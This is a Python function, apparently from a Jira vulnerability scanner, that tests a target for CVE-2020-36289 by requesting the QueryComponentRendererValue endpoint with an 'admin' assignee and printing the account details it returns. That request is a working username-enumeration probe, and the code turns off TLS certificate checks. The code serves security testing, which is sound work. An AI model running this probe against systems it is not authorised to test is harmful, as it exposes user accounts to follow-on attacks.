import requests
import json
from urllib.parse import urlparse
from colorama import Fore, Style

def check_cve_2020_36289(base_url):
    """
    Checks for CVE-2020-36289 (Username Enumeration via QueryComponentRendererValue).
    """
    cve_url = f"{base_url.rstrip('/')}/secure/QueryComponentRendererValue!Default.jspa?assignee=user:admin"
    vulnerabilities = ''  # String to store discovered vulnerabilities

    try:
        print(f"{Fore.YELLOW}\nINFO: Checking for CVE-2020-36289 (Username Enumeration via QueryComponentRendererValue){Style.RESET_ALL}")
        print(f"{Fore.BLUE}[Testing URL]{Style.RESET_ALL}: {cve_url}")
        response = requests.get(cve_url, allow_redirects=False, verify=False)

        # Check if the response indicates a vulnerability
        if response.status_code == 200:
            try:
                data = response.json()  # Parse JSON response

                if data:  # Non-empty response indicates a positive case
                    vulnerabilities += f"+ [Username Enumeration] Vulnerable to CVE-2020-36289 | URL: {cve_url}"
                    print(f"{Fore.GREEN}[+] Vulnerable to CVE-2020-36289{Style.RESET_ALL}")
                    print(f"  URL: {cve_url}")
                    print("\n  Response Details:")

                # Process the nested JSON structure
                    if "assignee" in data:
                        assignee_data = data["assignee"]
                        name = assignee_data.get("name", "Unknown")
                        view_html = assignee_data.get("viewHtml", "No View HTML Provided")
                        edit_html = assignee_data.get("editHtml", "No Edit HTML Provided")
                        jql = assignee_data.get("jql", "No JQL Provided")
                        valid_searcher = assignee_data.get("validSearcher", False)
                        is_shown = assignee_data.get("isShown", False)

                        # Print the structured output
                        print(f"  Assignee:")
                        print(f"    - Name: {name}")
                        print(f"    - View HTML (First 50 chars): {view_html[:50]}")
                        print(f"    - Edit HTML (First 50 chars): {edit_html[:50]}...")
                        print(f"    - JQL: {jql}")
                        print(f"    - Valid Searcher: {valid_searcher}")
                        print(f"    - Is Shown: {is_shown}")
                else:
                    print(f"{Fore.YELLOW}- No CVE-2020-36289 vulnerability detected on {cve_url}: Empty Response ({{}}){Style.RESET_ALL}")
            except json.JSONDecodeError:
                print(f"{Fore.RED}- Failed to parse JSON response: {cve_url}{Style.RESET_ALL}")
        elif response.status_code == 401:
            print(f"{Fore.YELLOW}- Not Vulnerable: HTTP 401 Unauthorized on {cve_url}{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}- Not Vulnerable: HTTP {response.status_code}{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}- An error occurred while checking {cve_url}: {e}{Style.RESET_ALL}")

    return vulnerabilities
